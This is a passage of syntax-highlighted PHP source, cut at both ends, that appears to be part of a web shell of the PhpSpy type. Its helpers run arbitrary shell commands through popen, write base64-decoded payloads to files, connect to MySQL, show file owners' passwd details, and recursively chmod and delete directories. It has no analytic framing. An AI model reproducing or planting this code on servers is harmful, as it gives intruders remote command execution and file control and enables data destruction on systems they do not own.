<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">res</span> = <span style="color: #3e999f;">''</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">while</span>(!@<span style="color: #4d4d4c; background-color: #ffffff;">feof(</span>$<span style="color: #eab700;">f</span>)) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">res</span> .= @<span style="color: #4d4d4c; background-color: #ffffff;">fread(</span>$<span style="color: #eab700;">f</span>,<span style="color: #4d4d4c; background-color: #ffffff;">1024</span>);<span style="color: #c82829; background-color: #d6d6d6;"> </span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   @<span style="color: #4d4d4c; background-color: #ffffff;">pclose(</span>$<span style="color: #eab700;">f</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">return</span> $<span style="color: #eab700;">res</span>;
}
<span style="color: #718c00;">function</span> <span style="color: #f5871f;">which</span>($<span style="color: #eab700;">pr</span>) {
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">path</span> = <span style="color: #4d4d4c; background-color: #ffffff;">execute(</span><span style="color: #3e999f;">"which $pr"</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">return</span> ($<span style="color: #eab700;">path</span> ? $<span style="color: #eab700;">path</span> : $<span style="color: #eab700;">pr</span>);<span style="color: #c82829; background-color: #d6d6d6;"> </span>
}

<span style="color: #718c00;">function</span> <span style="color: #f5871f;">cf</span>($<span style="color: #eab700;">fname</span>,$<span style="color: #eab700;">text</span>){
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span>($<span style="color: #eab700;">fp</span>=@<span style="color: #4d4d4c; background-color: #ffffff;">fopen(</span>$<span style="color: #eab700;">fname</span>,<span style="color: #3e999f;">'w'</span>)) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   @<span style="color: #4d4d4c; background-color: #ffffff;">fputs(</span>$<span style="color: #eab700;">fp</span>,@<span style="color: #4d4d4c; background-color: #ffffff;">base64_decode(</span>$<span style="color: #eab700;">text</span>));
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   @<span style="color: #4d4d4c; background-color: #ffffff;">fclose(</span>$<span style="color: #eab700;">fp</span>);
<span style="background-color: #d6d6d6;"> </span>   }
}
<span style="color: #718c00;">function</span> <span style="color: #f5871f;">dirsize</span>($<span style="color: #eab700;">dir</span>) {<span style="color: #c82829; background-color: #d6d6d6;"> </span>
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">dh</span> = @<span style="color: #4d4d4c; background-color: #ffffff;">opendir(</span>$<span style="color: #eab700;">dir</span>);
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">size</span> = <span style="color: #4d4d4c; background-color: #ffffff;">0</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">while</span>($<span style="color: #eab700;">file</span> = @<span style="color: #4d4d4c; background-color: #ffffff;">readdir(</span>$<span style="color: #eab700;">dh</span>)) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> ($<span style="color: #eab700;">file</span> != <span style="color: #3e999f;">'.'</span> &amp;&amp; $<span style="color: #eab700;">file</span> != <span style="color: #3e999f;">'..'</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">path</span> = $<span style="color: #eab700;">dir</span>.<span style="color: #3e999f;">'/'</span>.$<span style="color: #eab700;">file</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">size</span> += @<span style="color: #4d4d4c; background-color: #ffffff;">is_dir(</span>$<span style="color: #eab700;">path</span>) ? <span style="color: #4d4d4c; background-color: #ffffff;">dirsize(</span>$<span style="color: #eab700;">path</span>) : @<span style="color: #4d4d4c; background-color: #ffffff;">filesize(</span>$<span style="color: #eab700;">path</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   @<span style="color: #4d4d4c; background-color: #ffffff;">closedir(</span>$<span style="color: #eab700;">dh</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">return</span> $<span style="color: #eab700;">size</span>;
}
<span style="color: #8e908c; font-style: italic;">// </span><span style="color: #8e908c; font-style: italic;">&#39029;&#38754;&#35843;&#35797;&#20449;&#24687;</span>
<span style="color: #718c00;">function</span> <span style="color: #f5871f;">debuginfo</span>() {
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">global</span> $<span style="color: #eab700;">starttime</span>;
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">mtime</span> = <span style="color: #4d4d4c; background-color: #ffffff;">explode(</span><span style="color: #3e999f;">' '</span>, <span style="color: #4d4d4c; background-color: #ffffff;">microtime(</span>));
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">totaltime</span> = <span style="color: #4d4d4c; background-color: #ffffff;">number_format(</span>($<span style="color: #eab700;">mtime</span>[<span style="color: #4d4d4c; background-color: #ffffff;">1</span>] + $<span style="color: #eab700;">mtime</span>[<span style="color: #4d4d4c; background-color: #ffffff;">0</span>] - $<span style="color: #eab700;">starttime</span>), <span style="color: #4d4d4c; background-color: #ffffff;">6</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">echo</span> <span style="color: #3e999f;">'Processed in '</span>.$<span style="color: #eab700;">totaltime</span>.<span style="color: #3e999f;">' second(s)'</span>;
}

<span style="color: #8e908c; font-style: italic;">//</span><span style="color: #8e908c; font-style: italic;">&#36830;&#25509;MYSQL&#25968;&#25454;&#24211;</span>
<span style="color: #718c00;">function</span> <span style="color: #f5871f;">mydbconn</span>($<span style="color: #eab700;">dbhost</span>,$<span style="color: #eab700;">dbuser</span>,$<span style="color: #eab700;">dbpass</span>,$<span style="color: #eab700;">dbname</span>=<span style="color: #3e999f;">''</span>,$<span style="color: #eab700;">charset</span>=<span style="color: #3e999f;">''</span>,$<span style="color: #eab700;">dbport</span>=<span style="color: #3e999f;">'3306'</span>)<span style="text-decoration: underline;"> {</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">global</span> $<span style="color: #eab700;">charsetdb</span>;
<span style="background-color: #d6d6d6;"> </span>   @<span style="color: #4d4d4c; background-color: #ffffff;">ini_set(</span><span style="color: #3e999f;">'mysql.connect_timeout'</span>, <span style="color: #4d4d4c; background-color: #ffffff;">5</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span>(!$<span style="color: #eab700;">link</span> = @<span style="color: #4d4d4c; background-color: #ffffff;">mysql_connect(</span>$<span style="color: #eab700;">dbhost</span>.<span style="color: #3e999f;">':'</span>.$<span style="color: #eab700;">dbport</span>, $<span style="color: #eab700;">dbuser</span>, $<span style="color: #eab700;">dbpass</span>)) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;h2&gt;Can not connect to MySQL server&lt;/h2&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">exit</span>;
<span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span>($<span style="color: #eab700;">link</span> &amp;&amp; $<span style="color: #eab700;">dbname</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> (!@<span style="color: #4d4d4c; background-color: #ffffff;">mysql_select_db(</span>$<span style="color: #eab700;">dbname</span>, $<span style="color: #eab700;">link</span>)) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">p(</span><span style="color: #3e999f;">'&lt;h2&gt;Database selected has error&lt;/h2&gt;'</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">exit</span>;
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span>($<span style="color: #eab700;">link</span> &amp;&amp; <span style="color: #4d4d4c; background-color: #ffffff;">mysql_get_server_info(</span>) &gt; <span style="color: #3e999f;">'4.1'</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span>($<span style="color: #eab700;">charset</span> &amp;&amp; <span style="color: #4d4d4c; background-color: #ffffff;">in_array(strtolower(</span>$<span style="color: #eab700;">charset</span>), $<span style="color: #eab700;">charsetdb</span>)) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">q(</span><span style="color: #3e999f;">"SET character_set_connection=$charset, character_set_results=$cha</span><span style="color: #3e999f; text-decoration: underline;">rset, character_set_client=binary;"</span><span style="text-decoration: underline;">, $</span><span style="color: #eab700; text-decoration: underline;">link</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">return</span> $<span style="color: #eab700;">link</span>;
}

<span style="color: #8e908c; font-style: italic;">// </span><span style="color: #8e908c; font-style: italic;">&#21435;&#25481;&#36716;&#20041;&#23383;&#31526;</span>
<span style="color: #718c00;">function</span> <span style="color: #f5871f;">s_array</span>(&amp;$<span style="color: #eab700;">array</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> (<span style="color: #4d4d4c; background-color: #ffffff;">is_array(</span>$<span style="color: #eab700;">array</span>)) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">foreach</span> ($<span style="color: #eab700;">array</span> <span style="color: #718c00;">as</span> $<span style="color: #eab700;">k</span> =&gt; $<span style="color: #eab700;">v</span>) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">array</span>[$<span style="color: #eab700;">k</span>] = <span style="color: #4d4d4c; background-color: #ffffff;">s_array(</span>$<span style="color: #eab700;">v</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   } <span style="color: #718c00;">else</span> <span style="color: #718c00;">if</span> (<span style="color: #4d4d4c; background-color: #ffffff;">is_string(</span>$<span style="color: #eab700;">array</span>)) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">array</span> = <span style="color: #4d4d4c; background-color: #ffffff;">stripslashes(</span>$<span style="color: #eab700;">array</span>);
<span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">return</span> $<span style="color: #eab700;">array</span>;
}

<span style="color: #8e908c; font-style: italic;">// </span><span style="color: #8e908c; font-style: italic;">&#28165;&#38500;HTML&#20195;&#30721;</span>
<span style="color: #718c00;">function</span> <span style="color: #f5871f;">html_clean</span>($<span style="color: #eab700;">content</span>) {
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">content</span> = <span style="color: #4d4d4c; background-color: #ffffff;">htmlspecialchars(</span>$<span style="color: #eab700;">content</span>);
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">content</span> = <span style="color: #4d4d4c; background-color: #ffffff;">str_replace(</span><span style="color: #3e999f;">"\n"</span>, <span style="color: #3e999f;">"&lt;br /&gt;"</span>, $<span style="color: #eab700;">content</span>);
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">content</span> = <span style="color: #4d4d4c; background-color: #ffffff;">str_replace(</span><span style="color: #3e999f;">"  "</span>, <span style="color: #3e999f;">"&amp;nbsp;&amp;nbsp;"</span>, $<span style="color: #eab700;">content</span>);
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">content</span> = <span style="color: #4d4d4c; background-color: #ffffff;">str_replace(</span><span style="color: #3e999f;">"\t"</span>, <span style="color: #3e999f;">"&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;"</span>, $<span style="color: #eab700;">content</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">return</span> $<span style="color: #eab700;">content</span>;
}

<span style="color: #8e908c; font-style: italic;">// </span><span style="color: #8e908c; font-style: italic;">&#33719;&#21462;&#26435;&#38480;</span>
<span style="color: #718c00;">function</span> <span style="color: #f5871f;">getChmod</span>($<span style="color: #eab700;">filepath</span>){
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">return</span> <span style="color: #4d4d4c; background-color: #ffffff;">substr(base_convert(</span>@<span style="color: #4d4d4c; background-color: #ffffff;">fileperms(</span>$<span style="color: #eab700;">filepath</span>),<span style="color: #4d4d4c; background-color: #ffffff;">10</span>,<span style="color: #4d4d4c; background-color: #ffffff;">8</span>),-<span style="color: #4d4d4c; background-color: #ffffff;">4</span>);
}

<span style="color: #718c00;">function</span> <span style="color: #f5871f;">getPerms</span>($<span style="color: #eab700;">filepath</span>) {
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">mode</span> = @<span style="color: #4d4d4c; background-color: #ffffff;">fileperms(</span>$<span style="color: #eab700;">filepath</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> (($<span style="color: #eab700;">mode</span> &amp; <span style="color: #4d4d4c; background-color: #ffffff;">0</span>xC000) === <span style="color: #4d4d4c; background-color: #ffffff;">0</span>xC000) {$<span style="color: #eab700;">type</span> = <span style="color: #3e999f;">'s'</span>;}
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">elseif</span> (($<span style="color: #eab700;">mode</span> &amp; <span style="color: #4d4d4c; background-color: #ffffff;">0</span>x4000) === <span style="color: #4d4d4c; background-color: #ffffff;">0</span>x4000) {$<span style="color: #eab700;">type</span> = <span style="color: #3e999f;">'d'</span>;}
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">elseif</span> (($<span style="color: #eab700;">mode</span> &amp; <span style="color: #4d4d4c; background-color: #ffffff;">0</span>xA000) === <span style="color: #4d4d4c; background-color: #ffffff;">0</span>xA000) {$<span style="color: #eab700;">type</span> = <span style="color: #3e999f;">'l'</span>;}
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">elseif</span> (($<span style="color: #eab700;">mode</span> &amp; <span style="color: #4d4d4c; background-color: #ffffff;">0</span>x8000) === <span style="color: #4d4d4c; background-color: #ffffff;">0</span>x8000) {$<span style="color: #eab700;">type</span> = <span style="color: #3e999f;">'-'</span>;}<span style="color: #c82829; background-color: #d6d6d6;"> </span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">elseif</span> (($<span style="color: #eab700;">mode</span> &amp; <span style="color: #4d4d4c; background-color: #ffffff;">0</span>x6000) === <span style="color: #4d4d4c; background-color: #ffffff;">0</span>x6000) {$<span style="color: #eab700;">type</span> = <span style="color: #3e999f;">'b'</span>;}
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">elseif</span> (($<span style="color: #eab700;">mode</span> &amp; <span style="color: #4d4d4c; background-color: #ffffff;">0</span>x2000) === <span style="color: #4d4d4c; background-color: #ffffff;">0</span>x2000) {$<span style="color: #eab700;">type</span> = <span style="color: #3e999f;">'c'</span>;}
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">elseif</span> (($<span style="color: #eab700;">mode</span> &amp; <span style="color: #4d4d4c; background-color: #ffffff;">0</span>x1000) === <span style="color: #4d4d4c; background-color: #ffffff;">0</span>x1000) {$<span style="color: #eab700;">type</span> = <span style="color: #3e999f;">'p'</span>;}
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">else</span> {$<span style="color: #eab700;">type</span> = <span style="color: #3e999f;">'?'</span>;}

<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">owner</span>[<span style="color: #3e999f;">'read'</span>] = ($<span style="color: #eab700;">mode</span> &amp; <span style="color: #4d4d4c; background-color: #ffffff;">00400</span>) ? <span style="color: #3e999f;">'r'</span> : <span style="color: #3e999f;">'-'</span>;<span style="color: #c82829; background-color: #d6d6d6;"> </span>
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">owner</span>[<span style="color: #3e999f;">'write'</span>] = ($<span style="color: #eab700;">mode</span> &amp; <span style="color: #4d4d4c; background-color: #ffffff;">00200</span>) ? <span style="color: #3e999f;">'w'</span> : <span style="color: #3e999f;">'-'</span>;<span style="color: #c82829; background-color: #d6d6d6;"> </span>
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">owner</span>[<span style="color: #3e999f;">'execute'</span>] = ($<span style="color: #eab700;">mode</span> &amp; <span style="color: #4d4d4c; background-color: #ffffff;">00100</span>) ? <span style="color: #3e999f;">'x'</span> : <span style="color: #3e999f;">'-'</span>;<span style="color: #c82829; background-color: #d6d6d6;"> </span>
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">group</span>[<span style="color: #3e999f;">'read'</span>] = ($<span style="color: #eab700;">mode</span> &amp; <span style="color: #4d4d4c; background-color: #ffffff;">00040</span>) ? <span style="color: #3e999f;">'r'</span> : <span style="color: #3e999f;">'-'</span>;<span style="color: #c82829; background-color: #d6d6d6;"> </span>
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">group</span>[<span style="color: #3e999f;">'write'</span>] = ($<span style="color: #eab700;">mode</span> &amp; <span style="color: #4d4d4c; background-color: #ffffff;">00020</span>) ? <span style="color: #3e999f;">'w'</span> : <span style="color: #3e999f;">'-'</span>;<span style="color: #c82829; background-color: #d6d6d6;"> </span>
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">group</span>[<span style="color: #3e999f;">'execute'</span>] = ($<span style="color: #eab700;">mode</span> &amp; <span style="color: #4d4d4c; background-color: #ffffff;">00010</span>) ? <span style="color: #3e999f;">'x'</span> : <span style="color: #3e999f;">'-'</span>;<span style="color: #c82829; background-color: #d6d6d6;"> </span>
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">world</span>[<span style="color: #3e999f;">'read'</span>] = ($<span style="color: #eab700;">mode</span> &amp; <span style="color: #4d4d4c; background-color: #ffffff;">00004</span>) ? <span style="color: #3e999f;">'r'</span> : <span style="color: #3e999f;">'-'</span>;<span style="color: #c82829; background-color: #d6d6d6;"> </span>
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">world</span>[<span style="color: #3e999f;">'write'</span>] = ($<span style="color: #eab700;">mode</span> &amp; <span style="color: #4d4d4c; background-color: #ffffff;">00002</span>) ? <span style="color: #3e999f;">'w'</span> : <span style="color: #3e999f;">'-'</span>;<span style="color: #c82829; background-color: #d6d6d6;"> </span>
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">world</span>[<span style="color: #3e999f;">'execute'</span>] = ($<span style="color: #eab700;">mode</span> &amp; <span style="color: #4d4d4c; background-color: #ffffff;">00001</span>) ? <span style="color: #3e999f;">'x'</span> : <span style="color: #3e999f;">'-'</span>;<span style="color: #c82829; background-color: #d6d6d6;"> </span>

<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span>( $<span style="color: #eab700;">mode</span> &amp; <span style="color: #4d4d4c; background-color: #ffffff;">0</span>x800 ) {$<span style="color: #eab700;">owner</span>[<span style="color: #3e999f;">'execute'</span>] = ($<span style="color: #eab700;">owner</span>[<span style="color: #3e999f;">'execute'</span>]==<span style="color: #3e999f;">'x'</span>) ? <span style="color: #3e999f;">'s'</span> : <span style="color: #3e999f;">'S</span><span style="color: #3e999f; text-decoration: underline;">'</span><span style="text-decoration: underline;">;}</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span>( $<span style="color: #eab700;">mode</span> &amp; <span style="color: #4d4d4c; background-color: #ffffff;">0</span>x400 ) {$<span style="color: #eab700;">group</span>[<span style="color: #3e999f;">'execute'</span>] = ($<span style="color: #eab700;">group</span>[<span style="color: #3e999f;">'execute'</span>]==<span style="color: #3e999f;">'x'</span>) ? <span style="color: #3e999f;">'s'</span> : <span style="color: #3e999f;">'S</span><span style="color: #3e999f; text-decoration: underline;">'</span><span style="text-decoration: underline;">;}</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span>( $<span style="color: #eab700;">mode</span> &amp; <span style="color: #4d4d4c; background-color: #ffffff;">0</span>x200 ) {$<span style="color: #eab700;">world</span>[<span style="color: #3e999f;">'execute'</span>] = ($<span style="color: #eab700;">world</span>[<span style="color: #3e999f;">'execute'</span>]==<span style="color: #3e999f;">'x'</span>) ? <span style="color: #3e999f;">'t'</span> : <span style="color: #3e999f;">'T</span><span style="color: #3e999f; text-decoration: underline;">'</span><span style="text-decoration: underline;">;}</span>

<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">return</span> $<span style="color: #eab700;">type</span><span style="color: #c82829; font-weight: bold;">.</span>$<span style="color: #eab700;">owner</span>[<span style="color: #3e999f;">'read'</span>].$<span style="color: #eab700;">owner</span>[<span style="color: #3e999f;">'write'</span>].$<span style="color: #eab700;">owner</span>[<span style="color: #3e999f;">'execute'</span>].$<span style="color: #eab700;">group</span>[<span style="color: #3e999f;">'read'</span>]<span style="text-decoration: underline;">.$</span><span style="color: #eab700; text-decoration: underline;">group</span><span style="text-decoration: underline;">[</span><span style="color: #3e999f; text-decoration: underline;">'write'</span><span style="text-decoration: underline;">].$</span><span style="color: #eab700; text-decoration: underline;">group</span><span style="text-decoration: underline;">[</span><span style="color: #3e999f; text-decoration: underline;">'execute'</span><span style="text-decoration: underline;">].$</span><span style="color: #eab700; text-decoration: underline;">world</span><span style="text-decoration: underline;">[</span><span style="color: #3e999f; text-decoration: underline;">'read'</span><span style="text-decoration: underline;">].$</span><span style="color: #eab700; text-decoration: underline;">world</span><span style="text-decoration: underline;">[</span><span style="color: #3e999f; text-decoration: underline;">'write'</span><span style="text-decoration: underline;">].$</span><span style="color: #eab700; text-decoration: underline;">world</span><span style="text-decoration: underline;">[</span><span style="color: #3e999f; text-decoration: underline;">'execute'</span><span style="text-decoration: underline;">];</span>
}

<span style="color: #718c00;">function</span> <span style="color: #f5871f;">getUser</span>($<span style="color: #eab700;">filepath</span>)     {
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> (<span style="color: #4d4d4c; background-color: #ffffff;">function_exists(</span><span style="color: #3e999f;">'posix_getpwuid'</span>)) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">array</span> = @<span style="color: #4d4d4c; background-color: #ffffff;">posix_getpwuid(</span>@<span style="color: #4d4d4c; background-color: #ffffff;">fileowner(</span>$<span style="color: #eab700;">filepath</span>));
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span> ($<span style="color: #eab700;">array</span> &amp;&amp; <span style="color: #4d4d4c; background-color: #ffffff;">is_array(</span>$<span style="color: #eab700;">array</span>)) {
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">return</span> <span style="color: #3e999f;">' / &lt;a href="#" title="User: '</span>.$<span style="color: #eab700;">array</span>[<span style="color: #3e999f;">'name'</span>].<span style="color: #3e999f;">'&amp;#13&amp;#10Passwd</span><span style="color: #3e999f; text-decoration: underline;">: '</span><span style="text-decoration: underline;">.$</span><span style="color: #eab700; text-decoration: underline;">array</span><span style="text-decoration: underline;">[</span><span style="color: #3e999f; text-decoration: underline;">'passwd'</span><span style="text-decoration: underline;">].</span><span style="color: #3e999f; text-decoration: underline;">'&amp;#13&amp;#10Uid: '</span><span style="text-decoration: underline;">.$</span><span style="color: #eab700; text-decoration: underline;">array</span><span style="text-decoration: underline;">[</span><span style="color: #3e999f; text-decoration: underline;">'uid'</span><span style="text-decoration: underline;">].</span><span style="color: #3e999f; text-decoration: underline;">'&amp;#13&amp;#10gid: '</span><span style="text-decoration: underline;">.$</span><span style="color: #eab700; text-decoration: underline;">array</span><span style="text-decoration: underline;">[</span><span style="color: #3e999f; text-decoration: underline;">'gid'</span><span style="text-decoration: underline;">].</span><span style="color: #3e999f; text-decoration: underline;">'&amp;#13&amp;#10Gecos: '</span><span style="text-decoration: underline;">.$</span><span style="color: #eab700; text-decoration: underline;">array</span><span style="text-decoration: underline;">[</span><span style="color: #3e999f; text-decoration: underline;">'gecos'</span><span style="text-decoration: underline;">].</span><span style="color: #3e999f; text-decoration: underline;">'&amp;#13&amp;#10Dir: '</span><span style="text-decoration: underline;">.$</span><span style="color: #eab700; text-decoration: underline;">array</span><span style="text-decoration: underline;">[</span><span style="color: #3e999f; text-decoration: underline;">'dir'</span><span style="text-decoration: underline;">].</span><span style="color: #3e999f; text-decoration: underline;">'&amp;#13&amp;#10Shell: '</span><span style="text-decoration: underline;">.$</span><span style="color: #eab700; text-decoration: underline;">array</span><span style="text-decoration: underline;">[</span><span style="color: #3e999f; text-decoration: underline;">'shell'</span><span style="text-decoration: underline;">].</span><span style="color: #3e999f; text-decoration: underline;">'"&gt;'</span><span style="text-decoration: underline;">.$</span><span style="color: #eab700; text-decoration: underline;">array</span><span style="text-decoration: underline;">[</span><span style="color: #3e999f; text-decoration: underline;">'name'</span><span style="text-decoration: underline;">].</span><span style="color: #3e999f; text-decoration: underline;">'&lt;/a&gt;'</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   }
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">return</span> <span style="color: #3e999f;">''</span>;
}

<span style="color: #8e908c; font-style: italic;">// </span><span style="color: #8e908c; font-style: italic;">&#21024;&#38500;&#30446;&#24405;</span>
<span style="color: #718c00;">function</span> <span style="color: #f5871f;">deltree</span>($<span style="color: #eab700;">deldir</span>) {
<span style="background-color: #d6d6d6;"> </span>   $<span style="color: #eab700;">mydir</span>=<span style="color: #718c00;">@dir</span>($<span style="color: #eab700;">deldir</span>);<span style="color: #c82829; background-color: #d6d6d6;">   </span>
<span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">while</span>($<span style="color: #eab700;">file</span>=$<span style="color: #eab700;">mydir</span>-&gt;<span style="color: #4d4d4c; background-color: #ffffff;">read</span>())     {<span style="color: #c82829; background-color: #d6d6d6;">       </span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #718c00;">if</span>((<span style="color: #4d4d4c; background-color: #ffffff;">is_dir(</span>$<span style="color: #eab700;">deldir</span>.<span style="color: #3e999f;">'/'</span>.$<span style="color: #eab700;">file</span>)) &amp;&amp; ($<span style="color: #eab700;">file</span>!=<span style="color: #3e999f;">'.'</span>) &amp;&amp; ($<span style="color: #eab700;">file</span>!=<span style="color: #3e999f;">'..'</span>)) {<span style="color: #c82829; background-color: #d6d6d6;"> </span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   @<span style="color: #4d4d4c; background-color: #ffffff;">chmod(</span>$<span style="color: #eab700;">deldir</span>.<span style="color: #3e999f;">'/'</span>.$<span style="color: #eab700;">file</span>,<span style="color: #4d4d4c; background-color: #ffffff;">0777</span>);
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   <span style="color: #4d4d4c; background-color: #ffffff;">deltree(</span>$<span style="color: #eab700;">deldir</span>.<span style="color: #3e999f;">'/'</span>.$<span style="color: #eab700;">file</span>);<span style="color: #c82829; background-color: #d6d6d6;"> </span>
<span style="background-color: #d6d6d6;"> </span>   <span style="background-color: #d6d6d6;"> </span>   }
